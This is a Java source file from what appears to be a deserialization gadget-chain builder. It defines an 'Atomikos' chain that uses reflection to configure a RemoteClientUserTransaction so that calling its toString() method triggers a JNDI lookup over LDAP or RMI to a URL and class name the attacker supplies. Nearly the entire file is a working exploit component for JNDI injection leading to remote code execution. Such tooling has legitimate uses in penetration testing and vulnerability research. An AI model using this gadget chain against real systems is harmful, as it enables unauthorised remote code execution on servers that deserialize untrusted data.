package org.ses.gadgetbuilder.chains1;

import com.atomikos.icatch.jta.RemoteClientUserTransaction;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

@Dependencies( { "com.atomikos:transactions-osgi:4.0.6", "javax.transaction:jta:1.1" } )
@Authors({ Authors.PWNTESTER, Authors.SCICCONE })
@Impact(Impact.JNDI)
public class Atomikos extends GadgetChain<ToStringTrampoline> {
    public Atomikos(ToStringTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        int sep = command.lastIndexOf('/');
        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        // create factory based on url
        String initialContextFactory;
        if (url.startsWith("ldap"))
            initialContextFactory = "com.sun.jndi.ldap.LdapCtxFactory";
        else
            initialContextFactory = "com.sun.jndi.rmi.registry.RegistryContextFactory";

        // create object
        RemoteClientUserTransaction rcut = new RemoteClientUserTransaction();

        // set values using reflection
        Reflections.setFieldValue(rcut, "initialContextFactory", initialContextFactory);
        Reflections.setFieldValue(rcut, "providerUrl", url);
        Reflections.setFieldValue(rcut, "userTransactionServerLookupName", className);

        return new TrampolineConnector(rcut);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.atomikos.icatch.jta.RemoteClientUserTransaction.toString()\n" +
            "com.atomikos.icatch.jta.RemoteClientUserTransaction.checkSetup()\n" +
            "javax.naming.InitialContext.lookup()";
    }
}
